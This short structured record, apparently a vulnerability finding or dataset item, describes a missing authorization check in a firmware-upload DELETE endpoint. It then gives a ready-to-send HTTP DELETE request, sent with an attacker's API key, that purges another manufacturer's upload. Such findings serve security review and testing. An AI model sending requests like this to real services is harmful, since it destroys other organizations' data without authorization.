diagnosis: The DELETE endpoint deletes in-progress firmware uploads matching uploadId using @tus/server datastore without verifying that the client's API key matches the organization that initiated the upload. Any customer can abort and purge firmware uploads of other manufacturers by guessing or enumerating upload IDs.
exploit_request:
DELETE /iot/firmware/uploads/firmware_v2.1_build_8819 HTTP/1.1
Host: ota.smartdevices.net
X-API-Key: live_dev_key_attacker_01
